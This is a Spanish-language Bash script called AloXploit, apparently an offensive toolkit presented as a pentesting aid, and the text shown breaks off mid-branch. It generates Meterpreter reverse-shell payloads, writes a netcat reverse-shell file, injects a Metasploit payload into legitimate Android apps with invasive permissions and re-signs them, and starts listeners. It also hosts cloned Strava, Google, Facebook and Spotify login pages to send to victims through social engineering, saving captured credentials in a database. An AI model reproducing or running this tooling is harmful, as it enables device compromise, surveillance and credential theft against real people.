#!/bin/bash
fincolor='\e[0m'
rojo='\e[0;31m'
amarillo='\e[0;33m'
azul='\e[0;34m'
azul2='\e[1;34m'
blanco='\e[0m'
verde='\e[1;32m'

#grep -B1 "information_schema" dump1.txt | head -1 | cut -f2 -d" "echo " "
echo ""

echo -e $rojo " ----------------------------------------------------------------   " $fincolor
echo -e $rojo " |                                                              |   " $fincolor
echo -e $rojo " |                   __   █   █  ___          __   _____ _____  |   " $fincolor
echo -e $rojo " |     /\    |      /  \   █ █  | _ \ |      /  \    |     |    |   " $fincolor
echo -e $rojo " |    /  \   |     | __ |   █   |___/ |     | __ |   |     |    |   " $fincolor
echo -e $rojo " |   /----\  |     |    |  █ █  |     |     |    |   |     |    |   " $fincolor
echo -e $rojo " |  /      \ |____  \__/  █   █ |     |____  \__/  __|__   |    |   " $fincolor
echo -e $rojo " |                                                            v2|   " $fincolor
echo -e $rojo " ----------------------------------------------------------------   " $fincolor






echo " "
echo -e $azul " Autor: Alonso Martinez Fernandez"
echo "  Script creado para facilitar las tareas de pentesting"
echo "  Herramientas utilizadas: Metasploit, Shellter, Setoolkit, Sqlmap, Nmap, Bettercap"
echo -e "  Para utilizar correctamente el script es necesario tener conocimientos de dichas aplicaciones" $fincolor
echo " "
echo -e $rojo "Cargando bases de datos... " $fincolor 
echo " "
#msfdb init >> /dev/null
#service postgresql start >> /dev/null




	# COMPROBACION DE PROGRAMAS INSTALADOS EN EL EQUIPO
	# SCRIPT PARA BUSCAR SI UN PROGRAMA ESTA INSTALADO EN MI EQUIPO
which xterm >/dev/null 2>&1 || { echo "Instalando xterm..."; apt-get install xterm -y >> /dev/null; }

which apache2 >/dev/null 2>&1 || { echo "Instalando Apache..."; apt-get install apache2 -y >> /dev/null; }

which mysql >/dev/null 2>&1 || { echo "Instalando MariaDB..."; apt-get install mariadb-server mariadb-client mariadb-test -y >> /dev/null; }

which php >/dev/null 2>&1 || { echo "Instalando PHP..."; apt-get install php libapache2-mod-php php-mysql -y >> /dev/null; }

which shellter >/dev/null 2>&1 || { echo "Instalando Shellter..."; apt-get install shellter -y >> /dev/null; }

which bettercap >/dev/null 2>&1 || { echo "Instalando Bettercap..."; apt-get install bettercap -y >> /dev/null; }

which setoolkit >/dev/null 2>&1 || { echo "Instalando SEToolkit..."; apt-get install set -y >> /dev/null; }

which msfconsole >/dev/null 2>&1 || echo "Debes instalar metasploit-framework"

which jarsigner >/dev/null 2>&1 || { echo "Instalando Jarsigner..."; apt-get install openjdk-11-jdk -y >> /dev/null; }

which apktool >/dev/null 2>&1 || { echo "Instalando Apktool..."; apt-get install apktool -y >> /dev/null; }





service mysql restart >> /dev/null
chmod 777 ngrok 2> /dev/null
	if [ $? -eq 1 ]
	then
		echo "Ngrok no está instalado o está situado en una ruta distinta a AloXploit"
	fi

ubic=`pwd`
#ip=`ifconfig | grep "inet" | head -1 | tr -s " " | cut -d" " -f3`
ip=`ifconfig | grep -A2 "eth0"| head -2 | tail -1 | tr -s " " | cut -d" " -f3`
#iprouter=`route | tail -1 | cut -f1 -d" "`
iprouter=`route | grep "eth0"| tail -1 | tr -s " " | cut -d" " -f1`
interfaz=`ip r | head -1 | cut -d " " -f5`
iprouter1=`ip r | head -1 | cut -d " " -f3`

	# COMPROBACION-CREACION EXISTENCIA BD 

mysql -u root -BNe 'USE aloxploitDatabase' > /dev/null 2> /dev/null

	if [ $? -eq 0 ]
	then
		echo "Los datos recogidos por aloxploit se guardaran en aloxploitDatabase"
	else
		#aqui deberia crear el usuario tambien
		mysql -e \ "CREATE USER 'aloxploit'@'localhost' IDENTIFIED BY 'alox123';"
		mysql -e \ "GRANT ALL PRIVILEGES ON *.* TO 'aloxploit'@'localhost';"
		mysql -e \ "CREATE DATABASE aloxploitDatabase"
		mysql -e \ "USE aloxploitDatabase; CREATE TABLE redes (mac VARCHAR(25), ip varchar(20), puertos varchar(5000), vulnerabilidades varchar(5000), directorios varchar(5000))"
		mysql -e \ "USE aloxploitDatabase; CREATE TABLE datos (email  varchar(50), password varchar(50), web varchar(50))"

		echo "Se ha creado la base de datos aloxploitDatabase para almacenar los datos extraidos"
	fi


# Copiamos las plantillas del phishing a la carpeta correspondiente

strava="/var/www/html/strava.php"
google="/var/www/html/google.php"
apple="/var/www/html/apple.php"
spotify="/var/www/html/spotify.php"
facebook="/var/www/html/facebook.php"
googlepng="/var/www/html/google.png"
css="/var/www/html/css"

if [ -f $strava ]
then 
        echo "existe" >> /dev/null
else
        cp ./Templates/strava.php /var/www/html
fi

if [ -f $google ]
then    
        echo "existe" >> /dev/null
else    
        cp ./Templates/google.php /var/www/html
fi
if [ -f $apple ]
then
        echo "existe" >> /dev/null
else
        cp ./Templates/apple.php /var/www/html
fi
if [ -f $spotify ]
then
        echo "existe" >> /dev/null
else
        cp ./Templates/spotify.php /var/www/html
fi
if [ -f $facebook ]
then
        echo "existe" >> /dev/null
else
        cp ./Templates/facebook.php /var/www/html
fi
if [ -f $googlepng ]
then
        echo "existe" >> /dev/null
else
        cp ./Templates/google.png /var/www/html
fi
if [ -f $css ]
then
        echo "existe" >> /dev/null
else
        cp -r ./Templates/css /var/www/html
fi





	#    MENU PRINCIPAL

menu=1
while [ $menu -gt 0 ]
do 

echo ""
echo -e  " $amarillo ------Selecciona una opción------ \e[0m "
echo "1. Crear archivo malicioso (shellcode)"
echo "2. Incrustar shellcode en aplicación legitima"
echo "3. Modo escucha"
echo "4. Escanear puertos"
echo "5. Realizar un phishing"
echo "6. Sql inyection (beta)"
echo "7. Base datos aloxploitDatabase"
echo "8. Ataques MITM"
echo "0. Salir"
read menu

echo ""
		# --- CREAR SHELLCODE ---

if [ $menu -eq 1 ]
then
         path=`pwd`
         cd shellcodes 2> /dev/null
         if [ $? -ne 0 ]
         then
         mkdir shellcodes
         cd shellcodes
         fi


dispositivo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Android" FALSE "Windows" FALSE "Linux" --width 350 --height 450 2> /dev/null`

echo " "
 
if [ $dispositivo = "Android" ]
then
	echo "Ha elegido Android"
	echo ""
	payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "seleccion" --column "Opciones" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" --width 400 --height 450 2> /dev/null`

# el valor del nombre lo pido aqui para sumarle el apk y luego en los otros el exe
	echo " "

	nombre=`zenity --title "ALOXPLOIT"  --text "Nombre del Shellcode"  --entry  --width 300 2> /dev/null`

	nombre="${nombre}.apk"
	echo " "

elif [ $dispositivo = "Windows" ]
then
	echo "Ha elegido Windows"
	echo ""
payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "Seleccion" --column "Opciones" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" --width 400 --height 450 2> /dev/null`


# el valor del nombre lo pido aqui para sumarle el apk y luego endispositivo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Android" FALSE "Windows" --width 350 --height 200 2> /dev/null` los otros el exe
        echo " "
        echo "Nombre del archivo"
	nombre=`zenity --title "ALOXPLOIT"  --text "Nombre del Shellcode"  --entry  --width 300 2> /dev/null`

        nombre="${nombre}.exe"
        echo " "

elif [ $dispositivo = "Linux" ]
then
	echo "Ha elegido Linux"
	nombre=`zenity --title "ALOXPLOIT"  --text "Nombre del Shellcode"  --entry  --width 300 2> /dev/null`
	nombre="${nombre}.sh"


else
#aqui deberia poner un elif y hace un bucle, si no elige la correcta la vuelve a pedir
	echo "opcion erronea"
	exit
fi

#aqui podria coger la ip yo directamente, en principio que la ponga el usuario
        ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip de escucha (tu ip, por defecto eth0)" --entry --entry-text $ip --width 300 2> /dev/null`
	puerto=`zenity --title "ALOXPLOIT" --text "selecciona un puerto de conexion (por defecto 4444)" --entry --entry-text "4444"  --width 300 2> /dev/null`

echo " "
echo -e "$amarillo --- Resumen del archivo creado --- $fincolor"
echo "$payload"
echo "$nombre"
echo "$ip2"
echo "$puerto"

#CREAR ARCHIVO

#Ya tenemos los datos vamos a crearlo
echo "Creando archivo..."

if [ $dispositivo  = "Android" ]
then
	msfvenom -p $payload LHOST=$ip2 LPORT=$puerto  -o $nombre
elif [ $dispositivo = "Windows" ]
then
	msfvenom -p $payload LHOST=$ip2 LPORT=$puerto -f exe -e x86/shikata_ga_nai -i 8 -o $nombre
elif [ $dispositivo = "Linux" ]
then
	echo "nc $ip2 $puerto -e /bin/bash &"  > $nombre
	#msfvenom -p $payload LHOST=$ip2 LPORT=$puerto -f exe -e x86/shikata_ga_nai -i 8 -o $nombre
fi

echo " "
echo -e " Archivo $verde $nombre $fincolor creado correctamente"
echo " ENVIA EL ARCHIVO AL EQUIPO VICTIMA Y VUELVA A EJECUTAR AloXploit PARA PONERTE EN ESCUCHA"
echo ""
cd $path

		# --- INCRUSTAR SHELLCODE EN APP ---

elif [ $menu -eq 2 ]
then

tipo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Windows" FALSE "Android" --width 350 --height 450 2> /dev/null`


	if [ $tipo = "Windows" ]
	then
		echo "Cargando..."
		shellter
	elif [ $tipo = "Android" ]
	then
	echo "Primero debes tener un archivo malicioso de android creado"
	sleep 3

	######------- SCRIPT DE MODIFICACION DE APK ----------
		path=`pwd`
		cd apps 2> /dev/null
		if [ $? -eq 1 ]
		then
		mkdir apps
		cd apps
		fi
	# introducir en esa carpeta la app a modificar
		echo "selecciona la apk creada anteriormente"
		sleep 3
	# lo siguiente me saca la ruta entera
	#ruta
		payload=`zenity --file-selection 2> /dev/null`
		cp $payload ./practica.apk
		newnombre=`zenity --entry --text "Escriba el nombre de la nueva apk" 2> /dev/null`
		echo "selecciona la apk a modificar"
		sleep 3

		app=`zenity --file-selection 2> /dev/null`
		cp $app ./${newnombre}.apk
	#cargando.. para ver fallos
		echo "0%"
	# y el payload apk creado antes
		apktool empty-framework-dir --force
		apktool d -f -o payload practica.apk
		apktool d -f -o original ${newnombre}.apk
		echo "20%"
		cd payload
		tar -cf - ./smali | (cd ../original; tar -xpf - )
		cd ../original
		grep -B2 "MAIN" AndroidManifest.xml > ../ruta.txt
		ruta=`egrep -o 'android:name="[^\"]+"' ../ruta.txt | sed 's/\"//g' | sed 's/android:name=//g' | sed 's/\./\//g' | head -1`
	# AQUI ESTA EL FALLO, en la linea de arriba, me saca todas las lineas, poner head -1 y probar
		rutasmali="smali/${ruta}.smali"
	# ahora hay que modificar el smali de esa ruta para añadir el invocador del payload
	# buscamos la linea
	#nano smali/$rutasmali 
		linea=`egrep -n "onCreate" $rutasmali | head -1 | cut -f1 -d':'`
	#añadimos el texto
		echo "40%"
	#pongo \a que es debajo
		sed -i "$linea a\invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V" $rutasmali
		cd ..
		echo "50%"
	# ahora hay que añadir los permisos
	#buscamos los permisos en payload
	#he visto en evildroid que los escribia el todos en una linea y los metia en una variable usando \n para que haga el salto de linea
	#buscamos la linea a insertar en el original
		lineaperm=`cat original/AndroidManifest.xml | grep -n "uses-permission" | head -1 | cut -f1 -d:`
		perms='    <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\n      <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATIOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n	<uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>'
	# insertamos los permisos al original
		sed -i "$lineaperm i\ $perms" original/AndroidManifest.xml
	# compilamos la apk
		echo "80%"
		apktool b original
		echo "--------------------------------------"
		echo "Crear par de claves para firmar la apk"
		echo "--------------------------------------"
		cd original/dist 2> /dev/null
	#si la carpeta dist no esta, es que no se ha creado la app por que no es compatible con mi programa
		if [ $? -eq 2 ]
		then
		cd ..
		rm -r apps
		echo "APLICACION NO COMPATIBLE CON ALOXPLOIT"
		else
		echo "Rellena los siguientes datos"
		keytool -genkey -v -keystore payl.keystore -alias payl -keyalg RSA -keysize 2048 -validity 10000
		echo "------------------------------------------------------------"
		echo "Escriba la password y espere mientras se firma la aplicacion"
		echo "------------------------------------------------------------"
	# TODO OK, aqui puedo redireccionar el jarsinger para que no llene la pantalla (si eso probarlo)
		jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore payl.keystore ${newnombre}.apk payl  >> /dev/null 

		cp ${newnombre}.apk /var/www/html
		mkdir $path/appmaliciosa 2> /dev/null
		cp ${newnombre}.apk $path/appmaliciosa

		cd $path
		rm -r apps


		echo "----------------------------------------------------------------------"
		echo "Aplicacion creada en ${path}/appmaliciosa y en el servidor"
		echo "----------------------------------------------------------------------"

		fi


	#####-------- FIN SCRIPT APK --------------
	#sh prueba3-apk.sh

	fi

		# --- PONER EN ESCUCHA CON METASPLOIT ---

elif [ $menu -eq 3 ]
then
	mode=`zenity --title "ALOXPLOIT" --list --text "Metodo de escucha" --radiolist --column "seleccion"  --column "Opciones" TRUE "Metasploit" FALSE "Netcat"  --width 350 --height 450 2> /dev/null`

	if [ $mode = "Metasploit" ]
	then
		auto=`zenity --title "ALOXPLOIT" --list --text "¿Como quiere trabajar con metasploit?" --radiolist --column "seleccion" --column "opciones"  TRUE "Automatico" FALSE "Manual" --width 350 --height 400 2> /dev/null`

		if [ $auto = "Automatico" ]
		then

		echo "Sobre que sistema vamos a crear la escucha?"
		dispositivo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Android" FALSE "Windows" --width 350 --height 4500 2> /dev/null`

			if [ $dispositivo = "Android" ]
			then
			echo "Ha elegido Android"

			payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "seleccion" --column "Opciones" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" --width 400 --height 450 2> /dev/null`

			elif [ $dispositivo = "Windows" ]
			then
			echo " Ha elegido Windows"
			payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "seleccion" --column "Opciones" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" --width 400 --height 450 2> /dev/null`
			fi


		echo " "
		ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip de escucha (tu ip, por defecto eth0)" --entry --entry-text $ip --width 300 2> /dev/null`
        	puerto=`zenity --title "ALOXPLOIT" --text "selecciona un puerto de conexion (por defecto 4444)" --entry --entry-text "4444"  --width 300 2> /dev/null`
		echo ""

		echo "Abrir msfconsole para poner en escucha"
		echo "Iniciando metasploit..."
		echo ""
	 	#arrancamos msf console para poner en escucha
		xterm -fa 'Monospace:size=18' -e "msfconsole -x 'use multi/handler; set LHOST $ip2; set LPORT $puerto; set payload $payload; exploit'"

	#	msfconsole -x 'use exploit/multi/handler; set payload $payload; set LHOST $ip; set LPORT $puerto; run'

	# lo siguiente es lo que hemos puesto anteriormente, que es lo que deberiamos escribir en metasploit
	#msfconsole
	#use exploit/multi/handler
	#set payload $payload
	#set LHOST $ip
	#set LPORT $puerto
	#run
		elif [ $auto = "Manual" ]
		then
		msfconsole
		fi

	elif [ $mode = "Netcat" ]
	then
	puerto=`zenity --title "ALOXPLOIT" --text "Selecciona el puerto de escucha (por defecto 4444)" --entry --entry-text "4444"  --width 300 2> /dev/null`
	xterm -fa 'Monospace:size=18' -e "nc -nlvp $puerto"
	fi



		# --- ESCANEAR PUERTOS ---

elif [ $menu -eq 4 ]
then 
	echo "escanear puertos"
	escaneo=`zenity --title "ALOXPLOIT" --list --text "Tipo de escaneo" --radiolist --column "seleccion"  --column "Opciones" TRUE "Escaneo de puertos y SO de la red" FALSE "Escaneo de vulnerabilidades" FALSE "Escaneo de directorios" --width 400 --height 500 2> /dev/null`
	a="Escaneo de puertos y SO de la red"
	b="Escaneo de vulnerabilidades"
	c="Escaneo de directorios"
	echo "$escaneo"
	if [ "$escaneo" = "$a" ]
	then
	echo " introduce la ip sobre la que hacer el escanner"
	echo ""

	ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip a escanear (por defecto router completo)" --entry --entry-text ${iprouter}/24 --width 300 2> /dev/null`
	

#/////////PARTE INSERCION BD ////
#	//COMPROBACION SI EXISTE LA IP O MAC PARA HACER UN UPDATE Y NO INSERT CADA VEZ QUE SE EJECUTE // HECHO FUNCIONA BIEN parte a///

		if [[ $ip2 =~ /24$ ]]
		then
		echo -e $verde "Escaner a toda la red - No se insertaran datos en la BD" $fincolor
		        nmap -sS -sV $ip2
		else

		nmap -sS -sV $ip2 > tmp.txt
		cat tmp.txt
	#nmap=`nmap -sS -sV $ip2`

	# voy a hacer una previa redirecion al archivo tmp y que haga el grp ahi

	#he hecho un nmpa completo que me lo muestra por pantalla y ahora guarda en la bd lo especificado

		nmapip=`egrep "Nmap scan" tmp.txt | cut -d" " -f5`
		nmapmac=`egrep "MAC Address" tmp.txt | cut -d" " -f3`
		nmappuertos=`grep "open" tmp.txt`

	if [[ -z $nmapmac ]] # esto me devuelve true si esta vacio
	then
	echo "no se encontro mac"
	else
			# busco si existe esa mac
		macbd=""
		macbd=$(mysql -u root -BNe "USE aloxploitDatabase; SELECT mac from redes where mac='$nmapmac'")
		#echo $nmapmac
		#echo $macbd
			if [[ -z $macbd ]]
			then
			echo -e $azul2 "Se insertan nuevos datos en BD" $fincolor
                        mysql -e \ "INSERT INTO redes (mac,ip,puertos) VALUES ('$nmapmac','$nmapip','$nmappuertos')" aloxploitDatabase
			else
			echo -e $azul2  "MAC ya registrada en la BD, se modifican los datos recogidos en el nmap" $fincolor
                        mysql -e \ "UPDATE redes SET ip = '$nmapip' , puertos = '$nmappuertos' where mac = '$nmapmac' " aloxploitDatabase
			fi

	#rm tmp.txt
		echo " Datos insertados en la base de datos"
	fi
		fi
#FIN PARTE INSERCION BD ////

	elif [ "$escaneo" = "$b" ]
	then
		ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip a escanear (por defecto router completo)" --entry --entry-text ${iprouter}/24 --width 300 2> /dev/null`


		if [[ $ip2 =~ /24$ ]]
                then
                echo "Escaner a toda la red - No se insertaran datos en la BD"
                        nmap --script vuln $ip2 
                else


		nmap --script vuln $ip2 > tmp.txt
		cat tmp.txt
 
		nmapip=`egrep "Nmap scan" tmp.txt | cut -d" " -f5`
                nmapmac=`egrep "MAC Address" tmp.txt | cut -d" " -f3`
		nmappuertos=`grep "open" tmp.txt`
		vuln=`cat tmp.txt`

	if [[ -z $nmapmac ]] # esto me devuelve true si esta vacio
        then
        echo "no se encontro mac"
        else
                        # busco si existe esa mac
                macbd=""
                macbd=$(mysql -u root -BNe "USE aloxploitDatabase; SELECT mac from redes where mac='$nmapmac'")
 
                        if [[ -z $macbd ]]
                        then
				echo -e $azul2 "Se insertan nuevos datos en BD" $fincolor
			 	grep "VULNERABLE" tmp.txt >> /dev/null
				if [ $? -eq 0 ]
				then
				 mysql -e \ "USE aloxploitDatabase; INSERT INTO redes (mac,ip,puertos,vulnerabilidades) VALUES ('$nmapmac','$nmapip','$nmappuertos','$vuln')" aloxploitDatabase
					if [ $? -eq 0 ]
					then
					echo -e $azul2 "Datos insertados correctamente en aloxploitDatabase" $fincolor
					else
					echo -e $azul2 "Los datos no se insertaron debido a que contiene palabras prohibidas en mysql" $fincolor
					fi
				else
				 mysql -e \ "USE aloxploitDatabase; INSERT INTO redes (mac,ip,puertos,vulnerabilidades) VALUES ('$nmapmac','$nmapip','$nmappuertos','NO SE HAN ENCONTRADO VULNERABILIDADES')" aloxploitDatabase
				fi

			else
				echo -e $azul2  "MAC ya registrada en la BD, se modifican los datos recogidos en el nmap" $fincolor
				grep "VULNERABLE" tmp.txt >> /dev/null
				if [ $? -eq 0 ]
				then
	                        mysql -e \ "UPDATE redes SET ip = '$nmapip' , puertos = '$nmappuertos' , vulnerabilidades = '$vuln' where mac = '$nmapmac' " aloxploitDatabase
        	                else
				mysql -e \ "UPDATE redes SET ip = '$nmapip' , puertos = '$nmappuertos' , vulnerabilidades = 'NO SE ENCONTRARON VULNERABILIDADES' where mac = '$nmapmac' " aloxploitDatabase
				fi

			fi

	fi

fi

	elif [ "$escaneo" = "$c" ]
	then

	ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip a escanear" --entry --entry-text ${iprouter}/24  --width 300 2> /dev/null`
	puerto=`zenity --title " ALOXPLOIT" --text "Selecciona el puerto" --entry --entry-text "80"  --width 300 2> /dev/null`

		 if [[ $ip2 =~ /24$ ]]
                then
                echo "Escaner a toda la red - No se insertaran datos en la BD"
		nmap -p $puerto --script=http-enum $ip2
		else

		nmap -p $puerto --script=http-enum $ip2 > tmp.txt
		cat tmp.txt

                nmapip=`egrep "Nmap scan" tmp.txt | cut -d" " -f5`
                nmapmac=`egrep "MAC Address" tmp.txt | cut -d" " -f3`
                directorios=`grep "|" tmp.txt`


		 	if [[ -z $nmapmac ]] # esto me devuelve true si esta vacio
        		then
        		echo "no se encontro mac"
        		else

                	macbd=""
                	macbd=$(mysql -u root -BNe "USE aloxploitDatabase; SELECT mac from redes where mac='$nmapmac'")
 
                        	if [[ -z $macbd ]]
                        	then
                                echo -e $azul2 "Se insertan nuevos datos en BD" $fincolor
                                echo $directorios > /dev/null
                                	if [ $? -eq 0 ]
                                	then
                                 	mysql -e \ "USE aloxploitDatabase; INSERT INTO redes (mac,ip,puertos,directorios) VALUES ('$nmapmac','$nmapip','$nmappuertos','$directorios')" aloxploitDatabase

                                	else
                                 	mysql -e \ "USE aloxploitDatabase; INSERT INTO redes (mac,ip,puertos,directorios) VALUES ('$nmapmac','$nmapip','$nmappuertos','NO SE ENCONTRARON DIRECTORIOS WEB')" aloxploitDatabase
                                	fi

                        	else
                                echo -e $azul2  "MAC ya registrada en la BD, se modifican los datos recogidos en el nmap" $fincolor
                                echo $directorios > /dev/null
                                	if [ $? -eq 0 ]
                                	then
                                	mysql -e \ "UPDATE redes SET ip = '$nmapip' , directorios = '$directorios' where mac = '$nmapmac' " aloxploitDatabase
                                	else
                               		mysql -e \ "UPDATE redes SET ip = '$nmapip' , directorios = 'NO SE ENCONTRARON DIRECTORIOS WEB ' where mac = '$nmapmac' " aloxploitDatabase

                                	fi

                        	fi

        		fi

		fi


	fi
	echo "fin"
	rm tmp.txt 2> /dev/null

		# --- REALIZAR PHISHING ---

elif [ $menu -eq 5 ]
then
	echo "Vamos a realizar un phishing"
	echo ""
	# dos opciones: 
	#con SET herramienta con muchas funciones, pero solo puedo red privada y n almacenar los datos
	#con mi codigo, se puede red privada o publica, alamcena los datos en la bd, pero tiene menos opciones


	
	phishing=`zenity --title "ALOXPLOIT" --list --text "Programa para realizar Phishing" --radiolist --column "seleccion"  --column "Opciones" TRUE "Aloxploit" FALSE "Setoolkit" --width 400 --height 500 2> /dev/null`

	if [ $phishing = "Aloxploit" ]
	then
	systemctl start apache2
	web=`zenity --title "ALOXPLOIT" --list --text "Selecciona web para phishing" --radiolist --column "seleccion"  --column "Opciones" TRUE "Strava" FALSE "Google" FALSE "Facebook" FALSE "Spotify" --width 400 --height 500 2> /dev/null`
	red=`zenity --title "ALOXPLOIT" --list --text "Selecciona si está dentro de su red" --radiolist --column "seleccion"  --column "Opciones" TRUE "Interna" FALSE "Externa" --width 400 --height 500 2> /dev/null`

		if [ "$web" = "Strava" ]
		then
			if [ "$red" = "Interna" ]
			then
			echo -e " --> Envía esta direccion a la victima a traves de ingenieria social: $azul ${ip}/strava.php $fincolor"
			else
# AÑADIR PAGEKITE (ELSE ZENITY PARA ELEGIR Y YA UN IF DE NGROK O PAGEKITE) (LO MISMO CON GOOGLE)
			tunel=`zenity --title "ALOXPLOIT" --list --text "Seleciona la herramienta para crear el tunel. (Para su funcionamiento ambas deben estar instaladas en la ruta de Aloxploit.)" --radiolist --column "seleccion"  --column "Opciones" TRUE "Pagekite" FALSE "Ngrok" --width 400 --height 400 2> /dev/null`
				if [ $tunel = "Ngrok" ]
				then
				echo -e " $azul2 --> Se ejecutará ngrok para abrir un puerto y salir de la red $fincolor"
				echo -e "$azul  Debes copiar la direccion de fordwarding, añadirle /strava.php y hacersela llegar a la victima $fincolor"
				echo ""
				ngrok=""

#sh /home/alonso/Descargas/ngrok.sh &
#xterm $ubic/ngrok http 80`
				xterm -fa 'Monospace:size=18' -e ./ngrok http 80 &  
				#sleep 3
                        	#which ./ngrok >/dev/null 2>&1 &&
                        	# ./ngrok http 80 & || 
                        	echo -e "$verde NGROK DEBE ESTAR INSTALADO - Para poder utilizar esta funcion debes estar registrado en la pagina de ngrok y tenerlo descargado en esta ubicación $fincolor"

 				elif [ $tunel = "Pagekite" ]
				then
				userpagekite=`zenity --title "ALOXPLOIT" --text "Nombre de usuario de pagekite" --entry  --width 300 2> /dev/null`
                                echo -e "$amarillo URL Strava: "https://${userpagekite}.pagekite.me/strava.php""
				xterm -fa 'Monospace:size=18' -e python3 pagekite.py 80 "${userpagekite}.pagekite.me"
				fi

			fi
		elif [ "$web" = "Google" ]
                then
                        if [ "$red" = "Interna" ]
                        then
                        echo -e " --> Envía esta direccion a la victima a traves de ingenieria social: $azul ${ip}/google.php $fincolor"
                        elif [ "$red" = "Externa" ]
			then
                                #tunel=`zenity --title "ALOXPLOIT" --text "Herramienta para crear el tunel" --entry  --width 300 2> /dev/null`
				tunel=`zenity --title "ALOXPLOIT" --text "Herramienta para crear el tunel (Pagekite/Ngrok)" --entry --entry-text "Pagekite" --width 300 2> /dev/null`
				 if [ $tunel = "Ngrok" ]
                                then
        	                echo -e " $azul2 --> Se ejecutará ngrok para abrir un puerto y salir de la red $fincolor"
	                        echo -e "$azul  Debes copiar la direccion de fordwarding, añadirle /google.php y hacersela llegar a la victima $fincolor"
                	        echo ""
                        	ngrok=""
				xterm -fa 'Monospace:size=18' -e ./ngrok http 80 &  
                                echo -e "$verde NGROK DEBE ESTAR INSTALADO - Para poder utilizar esta funcion debes estar registrado en la pagina de de ngrok y tenerlo descargado en esta ubicación $fincolor"

				elif [ $tunel = "Pagekite" ]
                                then
                                userpagekite=`zenity --title "ALOXPLOIT" --text "Nombre de usuario de pagekite" --entry  --width 300 2> /dev/null`
                                xterm -fa 'Monospace:size=18' -e python3 pagekite.py 80 "${userpagekite}.pagekite.me"
                                fi

			fi
# añadir facebook y Spotify:
                elif [ $web = "Facebook" ]
                then

		 if [ $red = "Interna" ]
                        then
                        echo -e " --> Envía esta direccion a la victima a traves de ingenieria social: $azul ${ip}/facebook.php $fincolor"
                        else
                        tunel=`zenity --title "ALOXPLOIT" --list --text "Seleciona la herramienta para crear el tunel." --radiolist --column "seleccion"  --column "Opciones" TRUE "Pagekite" FALSE "Ngrok" --width 400 --height 500 2> /dev/null`


                                if [ $tunel = "Ngrok" ]
                                then
                                echo -e " $azul2 --> Se ejecutará ngrok para abrir un puerto y salir de la red $fincolor"
                                echo -e "$azul  Debes copiar la direccion de fordwarding, añadirle /facebook.php y hacersela llegar a la victima $fincolor"
                                echo "" 
                                ngrok=""

                                xterm -fa 'Monospace:size=18' -e ./ngrok http 80 &  
                                echo -e "$verde NGROK DEBE ESTAR INSTALADO - Para poder utilizar esta funcion debes estar registrado en la pagina de ngrok y tenerlo descargado en esta ubicación $fincolor"

                                elif [ $tunel = "Pagekite" ]
                                then
                                userpagekite=`zenity --title "ALOXPLOIT" --text "Nombre de usuario de pagekite" --entry  --width 300 2> /dev/null`
				echo -e "$azul URL Facebook: "https://${userpagekite}.pagekite.me/facebook.php""
                                xterm -fa 'Monospace:size=18' -e python3 pagekite.py 80 "${userpagekite}.pagekite.me"
                                fi

                        fi

                elif [ $web = "Spotify" ]
                then

                 if [ $red = "Interna" ]
                        then
                        echo -e " --> Envía esta direccion a la victima a traves de ingenieria social: $azul ${ip}/spotify.php $fincolor"
                        else
                        tunel=`zenity --title "ALOXPLOIT" --list --text "Seleciona la herramienta para crear el tunel." --radiolist --column "seleccion"  --column "Opciones" TRUE "Pagekite" FALSE "Ngrok" --width 400 --height 500 2> /dev/null`


                                if [ $tunel = "Ngrok" ]
                                then
                                echo -e " $azul2 --> Se ejecutará ngrok para abrir un puerto y salir de la red $fincolor"
                                echo -e "$azul  Debes copiar la direccion de fordwarding, añadirle /spotify.php y hacersela llegar a la victima $fincolor"
                                echo "" 
                                ngrok=""

                                xterm -fa 'Monospace:size=18' -e ./ngrok http 80 &  
